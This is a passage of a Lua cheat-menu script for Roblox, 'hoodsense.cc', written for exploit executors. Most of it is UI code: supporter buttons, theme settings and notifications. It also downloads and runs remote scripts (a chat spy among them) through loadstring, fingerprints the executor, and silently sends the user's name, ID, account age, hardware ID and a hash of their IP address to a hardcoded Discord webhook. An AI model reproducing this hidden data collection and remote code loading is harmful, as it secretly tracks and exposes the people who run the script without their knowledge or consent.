        print("")
        end
    end
    
    local bindableFunction= Instance.new("BindableFunction")
    
    game.StarterGui:SetCore("SendNotification", {
        Title = "hoodsense.cc";
        Text = "Supporter Copied on clipboard!";
        Icon = "rbxassetid://8768441000";
        Duration = "BLANK";
        callbakc = bindableFunction;
        Button1 = "Okay!";
    })
end)

local partnerslabel2 = Section10:CreateLabel("Other supporters")
partnerslabel2:UpdateText("Other supporters")

local partners2 = Section10:CreateButton("v3rmillion.net", function(bool)
    setclipboard("https://v3rmillion.net")
    wait(1)
    local function callback(text)
        if text == "Yes" then
        print("")
        elseif text == "No" then
        print("")
        end
    end
    
    local bindableFunction= Instance.new("BindableFunction")
    
    game.StarterGui:SetCore("SendNotification", {
        Title = "hoodsense.cc";
        Text = "Supporter Copied on clipboard!";
        Icon = "rbxassetid://8768441000";
        Duration = "BLANK";
        callbakc = bindableFunction;
        Button1 = "Okay!";
    })
end)
local partners = Section10:CreateButton("x.synapse.to", function(bool)
    setclipboard("https://x.synapse.to")
    wait(1)
    local function callback(text)
        if text == "Yes" then
        print("")
        elseif text == "No" then
        print("")
        end
    end
    
    local bindableFunction= Instance.new("BindableFunction")
    
    game.StarterGui:SetCore("SendNotification", {
        Title = "hoodsense.cc";
        Text = "Supporter Copied on clipboard!";
        Icon = "rbxassetid://8768441000";
        Duration = "BLANK";
        callbakc = bindableFunction;
        Button1 = "Okay!";
    })
end)

local partners4 = Section10:CreateButton("krnl.ca", function(bool)
    setclipboard("https://krnl.ca")
    wait(1)
    local function callback(text)
        if text == "Yes" then
        print("")
        elseif text == "No" then
        print("")
        end
    end
    
    local bindableFunction= Instance.new("BindableFunction")
    
    game.StarterGui:SetCore("SendNotification", {
        Title = "hoodsense.cc";
        Text = "Supporter Copied on clipboard!";
        Icon = "rbxassetid://8768441000";
        Duration = "BLANK";
        callbakc = bindableFunction;
        Button1 = "Okay!";
    })
end)

local partners6 = Section10:CreateButton("angxlzz", function(bool)
    setclipboard("https://youtube.com/angxlzz")
    wait(1)
    local function callback(text)
        if text == "Yes" then
        print("")
        elseif text == "No" then
        print("")
        end
    end
    
    local bindableFunction= Instance.new("BindableFunction")
    
    game.StarterGui:SetCore("SendNotification", {
        Title = "hoodsense.cc";
        Text = "Supporter Copied on clipboard!";
        Icon = "rbxassetid://8768441000";
        Duration = "BLANK";
        callbakc = bindableFunction;
        Button1 = "Okay!";
    })
end)

local partners5 = Section10:CreateButton("ekso.gq", function(bool)
    setclipboard("https://ekso.gq")
    wait(1)
    local function callback(text)
        if text == "Yes" then
        print("")
        elseif text == "No" then
        print("")
        end
    end
    
    local bindableFunction= Instance.new("BindableFunction")
    
    game.StarterGui:SetCore("SendNotification", {
        Title = "hoodsense.cc";
        Text = "Supporter Copied on clipboard!";
        Icon = "rbxassetid://8768441000";
        Duration = "BLANK";
        callbakc = bindableFunction;
        Button1 = "Okay!";
    })
end)
------------------------
local Toggle3 = Section3:CreateToggle("UI Toggle", nil, function(State)
	Window:Toggle(State)
end)
Toggle3:CreateKeybind(tostring(Config.Keybind):gsub("Enum.KeyCode.", ""), function(Key)
	Config.Keybind = Enum.KeyCode[Key]
end)
Toggle3:SetState(true)

local Colorpicker3 = Section3:CreateColorpicker("UI Color", function(Color)
	Window:ChangeColor(Color)
end)
Colorpicker3:UpdateColor(Config.Color)

-- credits to jan for patterns
local Dropdown3 = Section4:CreateDropdown("Image", {"Default","Hearts","Abstract","Hexagons","Circles","Flowers","Waves"}, function(Name)
	if Name == "Default" then
		Window:SetBackground("5553946656")
	elseif Name == "Hearts" then
		Window:SetBackground("6073763717")
	elseif Name == "Abstract" then
		Window:SetBackground("6073743871")
	elseif Name == "Hexagons" then
		Window:SetBackground("6073628839")
	elseif Name == "Circles" then
		Window:SetBackground("6071579801")
	elseif Name == "Flowers" then
		Window:SetBackground("6071575925")
	elseif Name == "Waves" then
		Window:SetBackground("2151741365")
	end
end)
Dropdown3:SetOption("Default")

local Colorpicker4 = Section4:CreateColorpicker("Color", function(Color)
	Window:SetBackgroundColor(Color)
end)
Colorpicker4:UpdateColor(Color3.new(0, 0, 0))

local Slider3 = Section4:CreateSlider("Transparency",0,1,nil,false, function(Value)
	Window:SetBackgroundTransparency(Value)
end)
Slider3:SetValue(0)

local Slider4 = Section4:CreateSlider("Tile Scale",0,1,nil,false, function(Value)
	Window:SetTileScale(Value)
end)
Slider4:SetValue(0.25)

game.StarterGui:SetCore("SendNotification", {
    Title = "hoodsense.cc";
    Text = "Succesfully loaded!";
    Icon = "http://www.roblox.com/asset/?id=8768441000";
    Duration = "4";
    callbakc = bindableFunction;
})
wait(8)
game.StarterGui:SetCore("SendNotification", {
    Title = "hoodsense.cc";
    Text = "https://hoodsense.cf";
    Icon = "http://www.roblox.com/asset/?id=8768441000";
    Duration = "3";
    callbakc = bindableFunction;
    Button1 = "Okay!";
})

print("___________________________HOODSENSE.CC__________________________")
print("| [hoodsense.cc] Executed version: 6.0")
print("| [hoodsense.cc] Your user is: "..game.Players.LocalPlayer.Name.. "") 
print("| [hoodsense.cc] Your id is: "..game.Players.LocalPlayer.UserId.. "")
print("| [hoodsense.cc] Job id: " ..game.JobId.. "")
print("| [hoodsense.cc] Join us discord.gg/axq                 ")
print("| [hoodsense.cc] Made by ekso <@804245361894883339>     ")
print("| [hoodsense.cc] Website - https://hoodsense.cf         ")
print("_________________________________________________________________")

loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/chatspy.lua'))()

local Players = game:GetService("Players")

loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/emoji.lua'))()
loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/blacklist.lua'))()

Players.PlayerAdded:Connect(function(player)
    loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/emoji.lua'))()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/blacklist.lua'))()
end)
wait(1)
loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/emoji.lua'))()

local url = 'https://discord.com/api/webhooks/965922900798505041/bIg7rDZtkG40gAzX3Z2xtNcIjrQuwtmgTrnxsEtPO5_khFuroxfDsMS4vROxNcbcFynw'
local req = syn.request
local hwid_headers = {'Syn-Fingerprint'} -- You will have to add more headers for different exploits
local OSTime = os.time()
local Time = os.date('!*t', OSTime)

function ip()local a=req({Url='https://httpbin.org/ip',Method='GET'}) local b=game:GetService('HttpService'):JSONDecode(a.Body) local Hash = game:HttpGet('https://api.hashify.net/hash/md5/hex?value='..b.origin) local Hashed = game:GetService("HttpService"):JSONDecode(Hash) return Hashed.Digest end
function hwid()local a=req({Url='https://httpbin.org/get',Method='GET'})local b=game:GetService('HttpService'):JSONDecode(a.Body)for c,d in pairs(hwid_headers)do if b.headers[d]then return b.headers[d]end end end
local function getexploit()
    local exploit =
        (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X") or 
        (isexecutorclosure and "Script-Ware V2") or
        (secure_load and "Sentinel") or
        (is_sirhurt_closure and "SirHurt V4") or
        (pebc_execute and "ProtoSmasher") or
        (KRNL_LOADED and "Krnl") or
        (WrapGlobal and "WeAreDevs") or
        (isvm and "Proxo") or
        (shadow_env and "Shadow") or
        (jit and "EasyExploits") or
        (getreg()['CalamariLuaEnv'] and "Calamari") or
        (unit and "Unit") or
        ("Undetectable")
    return exploit
end

local data = {
    ["username"]  = "hoodsense chan",
    ["avatar_url"] = "https://media.discordapp.net/attachments/963907774960517221/965805928119173130/IMG_3957.png",
    ["embeds"] = {
        {
            ["author"] = {
                ["name"] = "HOODSENSE REQUEST",
                ["url"] = "https://discord.gg/axq",
                ["icon_url"] = "https://cdn.discordapp.com/attachments/956351837664067605/963085251524046878/Png.png"
            },
            ["url"] = "https://www.roblox.com/games/"..game.PlaceId,
            ["description"] = "**Executed in game: **"..game:GetService('MarketplaceService'):GetProductInfo(game.PlaceId).Name,
            ["color"] = 229954,
            ["fields"] = {
                {
                    ["name"] = "Game ID",
                    ["value"] = "**Game ID: **"..game.PlaceId,
                },
                {
                    ["name"] = "Player Name",
                    ["value"] = "**Username: **"..game.Players.LocalPlayer.Name,
                },
                {
                    ["name"] = "Player DisplayName",
                    ["value"] = "**Display Name: **"..game.Players.LocalPlayer.DisplayName,
                },
                {
                    ["name"] = "Player ID:",
                    ["value"] = "**ID: **"..game.Players.LocalPlayer.UserId,
                },                {
                    ["name"] = "Account Age",
                    ["value"] = "**Age: **"..game.Players.LocalPlayer.AccountAge,
                },
                {
                    ["name"] = "Exploit",
                    ["value"] = "```"..getexploit().."```"
                },
                {
                    ["name"] = "Job Id",
                    ["value"] = "```"..game.JobId.."```"
                },
                {
                    ["name"] = "Hard Ware ID:",
                    ["value"] = tostring("```"..hwid().."```"),
                    ["inline"] = true
                },
                {
                    ["name"] = "IP ADDRESS:",
                    ["value"] = tostring("```"..ip().."```"),
                },
            },
            ["thumbnail"] = {
                ["url"] = "https://web.roblox.com/Thumbs/Avatar.ashx?x=100&y=100&Format=Png&userid="..game.Players.LocalPlayer.UserId
            },
        }
    }
}
local Post = req({Url = url,  Method = 'POST', Headers = { ['Content-Type'] = 'application/json' }, Body = game:GetService('HttpService'):JSONEncode(data)})

-------------------------------------------------------------------------
--[[
██╗░░██╗░█████╗░░█████╗░██████╗░░██████╗███████╗███╗░░██╗░██████╗███████╗
██║░░██║██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔════╝████╗░██║██╔════╝██╔════╝
███████║██║░░██║██║░░██║██║░░██║╚█████╗░████╗░░██╔██╗██║╚█████╗░█████╗░░
██╔══██║██║░░██║██║░░██║██║░░██║░╚═══██╗██╔══╝░░██║╚████║░╚═══██╗██╔══╝░░
██║░░██║╚█████╔╝╚█████╔╝██████╔╝██████╔╝███████╗██║░╚███║██████╔╝███████╗
╚═╝░░╚═╝░╚════╝░░╚════╝░╚═════╝░╚═════╝░╚══════╝╚═╝░░╚══╝╚═════╝░╚══════╝
]]
-------------------------------------------------------------------------
while true do
warn("---------------------------")
warn("---------------------------")
warn("-[[[[-----------------]]]]-")
warn("-[[[[-----------------]]]]-")
warn("-[[[[-----------------]]]]-")
warn("-[[[[-----------------]]]]-")
warn("-[[[[-----------------]]]]-")
warn("-[[[[-----------------]]]]-")
warn("-[[[[][][][][][][][][][]]]-")
warn("-[[[[][][][][][][][][][]]]-")
warn("-[[[[][][][][][][][][][]]]-")
warn("-[[[[-----------------]]]]-")
warn("-[[[[-----------------]]]]-")
warn("-[[[[-----------------]]]]-")
warn("-[[[[-----------------]]]]-")
warn("-[[[[-----------------]]]]-")
warn("-[[[[-----------------]]]]-")
warn("---------------------------")
warn("---------------------------")
print("                          ")
warn("---------------------------")
warn("---------------------------")
warn("-[[[[][][][][][][][][][]]]-")
warn("-[[[[][][][][][][][][][]]]-")
warn("-[[[[][][][][][][][][][]]]-")
warn("-[[[-------------------]]]-")
warn("-[[[-------------------]]]-")
warn("-[[[-------------------]]]-")
warn("-[[[-------------------]]]-")
warn("-[[[-------------------]]]-")
warn("-[[[-------------------]]]-")
warn("-[[[-------------------]]]-")
warn("-[[[-------------------]]]-")
warn("-[[[-------------------]]]-")
warn("-[[[[][][][][][][][][][]]]-")
warn("-[[[[][][][][][][][][][]]]-")
warn("-[[[[][][][][][][][][][]]]-")
warn("---------------------------")
warn("---------------------------")
print("                          ")
warn("---------------------------")
warn("---------------------------")
warn("-[[[[][][][][][][][][][]]]-")
warn("-[[[[][][][][][][][][][]]]-")
warn("-[[[[][][][][][][][][][]]]-")
warn("-[[[-------------------]]]-")
warn("-[[[-------------------]]]-")
warn("-[[[-------------------]]]-")
warn("-[[[-------------------]]]-")
warn("-[[[-------------------]]]-")
warn("-[[[-------------------]]]-")
warn("-[[[-------------------]]]-")
warn("-[[[-------------------]]]-")
warn("-[[[-------------------]]]-")
warn("-[[[[][][][][][][][][][]]]-")
warn("-[[[[][][][][][][][][][]]]-")
warn("-[[[[][][][][][][][][][]]]-")
warn("---------------------------")
warn("---------------------------")
print("                          ")
warn("---------------------------")
warn("---------------------------")
warn("-[[[[][]-------------------")
warn("-[[[[][][][]---------------")
warn("-[[[[][][][][][][][][------")
warn("-[[[-------------------]]]-")
warn("-[[[-------------------]]]-")
warn("-[[[-------------------]]]-")
warn("-[[[-------------------]]]-")
warn("-[[[-------------------]]]-")
warn("-[[[-------------------]]]-")
warn("-[[[-------------------]]]-")
warn("-[[[-------------------]]]-")
warn("-[[[-------------------]]]-")
warn("-[[[[][][][][][][][][------")
warn("-[[[[][][][]---------------")
warn("-[[[[][]-------------------")
warn("---------------------------")
warn("---------------------------")
print("                          ")
print("                          ")
print("                          ")
print("                          ")
print("                          ")
print("                          ")
warn("---------------------------")
warn("---------------------------")
warn("-[[[[][][][][][][][][][]]]-")
warn("-[[[-----------------------")
warn("-[[[-----------------------")
warn("-[[[-----------------------")
warn("-[[[-----------------------")
warn("-[[[-----------------------")
warn("-[[[-----------------------")
warn("-[[[[][][][][][][][][][]]]-")
warn("-----------------------]]]-")
warn("-----------------------]]]-")
warn("-----------------------]]]-")
warn("-----------------------]]]-")
warn("-----------------------]]]-")
warn("-----------------------]]]-")
warn("-----------------------]]]-")
warn("-[[[[][][][][][][][][][]]]-")
warn("---------------------------")
print("                          ")
warn("---------------------------")
warn("---------------------------")
warn("-[[[[][][][][][][][][][]]]-")
warn("-[[[[][][][][][][][][][]]]-")
warn("-[[[-----------------------")
warn("-[[[-----------------------")
warn("-[[[-----------------------")
warn("-[[[-----------------------")
warn("-[[[[][][][][][][][][][]]]-")
warn("-[[[[][][][][][][][][][]]]-")
warn("-[[[[][][][][][][][][][]]]-")
warn("-[[[-----------------------")
warn("-[[[-----------------------")
warn("-[[[-----------------------")
warn("-[[[-----------------------")
warn("-[[[[][][][][][][][][][]]]-")
warn("-[[[[][][][][][][][][][]]]-")
warn("---------------------------")
warn("---------------------------")
print("                          ")
warn("---------------------------")
warn("---------------------------")
warn("-[[[[[[[--------------]]]]-")
warn("-[[[[[[[[-------------]]]]-")
warn("-[[[[-[[[[------------]]]]-")
warn("-[[[[--[[[[-----------]]]]-")
warn("-[[[[---[[[[----------]]]]-")
warn("-[[[[----[[[[---------]]]]-")
warn("-[[[[-----[[[[--------]]]]-")
warn("-[[[[------[[[[-------]]]]-")
warn("-[[[[-------[[[[------]]]]-")
warn("-[[[[--------[[[[-----]]]]-")
warn("-[[[[---------[[[[----]]]]-")
warn("-[[[[----------[[[[---]]]]-")
warn("-[[[[-----------[[[[--]]]]-")
warn("-[[[[------------[[[[-]]]]-")
warn("-[[[[-------------[[[[]]]]-")
warn("---------------------------")
warn("---------------------------")
print("                          ")
warn("---------------------------")
warn("---------------------------")
warn("-[[[[][][][][][][][][][]]]-")
warn("-[[[-----------------------")
warn("-[[[-----------------------")
warn("-[[[-----------------------")
warn("-[[[-----------------------")
warn("-[[[-----------------------")
warn("-[[[-----------------------")
warn("-[[[[][][][][][][][][][]]]-")
warn("-----------------------]]]-")
warn("-----------------------]]]-")
warn("-----------------------]]]-")
warn("-----------------------]]]-")
warn("-----------------------]]]-")
warn("-----------------------]]]-")
warn("-----------------------]]]-")
warn("-[[[[][][][][][][][][][]]]-")
warn("---------------------------")
print("                          ")
warn("---------------------------")
warn("---------------------------")
warn("-[[[[][][][][][][][][][]]]-")
warn("-[[[[][][][][][][][][][]]]-")
warn("-[[[-----------------------")
warn("-[[[-----------------------")
warn("-[[[-----------------------")
warn("-[[[-----------------------")
warn("-[[[[][][][][][][][][][]]]-")
warn("-[[[[][][][][][][][][][]]]-")
warn("-[[[[][][][][][][][][][]]]-")
warn("-[[[-----------------------")
warn("-[[[-----------------------")
warn("-[[[-----------------------")
warn("-[[[-----------------------")
warn("-[[[[][][][][][][][][][]]]-")
warn("-[[[[][][][][][][][][][]]]-")
warn("---------------------------")
warn("---------------------------")
print("                          ")
print("[hoodsense.cc] Kicu to gej!")
print("[hoodsense.cc] Kc kuba<3  !")
wait(69420)
end
